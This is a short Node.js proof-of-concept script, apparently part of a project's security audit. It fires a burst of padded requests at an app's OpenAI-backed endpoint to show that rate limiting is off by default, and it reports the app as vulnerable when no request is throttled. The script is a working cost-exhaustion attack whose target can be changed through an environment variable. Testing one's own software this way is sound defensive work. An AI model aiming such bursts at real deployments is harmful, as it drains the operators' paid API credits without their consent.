// OpenAI wallet drain POC
//
// The rate limiter for OpenAI endpoints is opt-in and off by default.
// This sends a burst of requests to show there's no throttle.
// Each request that hits OpenAI costs real tokens.
//
// Run: node security/poc/05-openai-cost-drain.mjs

const TARGET = process.env.TARGET || 'http://localhost:4173';

async function main() {
  console.log('testing openai endpoint rate limiting...\n');

  let ok = 0, limited = 0, err = 0;

  const jobs = Array.from({ length: 20 }, () =>
    fetch(TARGET + '/api/openai/hud-summary', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        place: 'A'.repeat(500),
        street: 'B'.repeat(500),
        nearbyPlaces: Array(20).fill('somewhere'),
      }),
    }).then(r => {
      if (r.status === 429) limited++;
      else if (r.status >= 500) err++;
      else ok++;
    }).catch(() => { err++; })
  );

  await Promise.all(jobs);

  console.log('20-request burst results:');
  console.log('  processed (costs tokens): ' + ok);
  console.log('  rate limited (429):       ' + limited);
  console.log('  errors/no-key:            ' + err);

  if (limited === 0 && ok > 0) {
    console.log('\nVULNERABLE — no rate limit on openai endpoints by default');
    console.log('env var GEV_RATELIMIT_OPENAI_PER_MIN is unset = unlimited');
    console.log('at sustained load this burns through api credits fast');
  }
}

main();
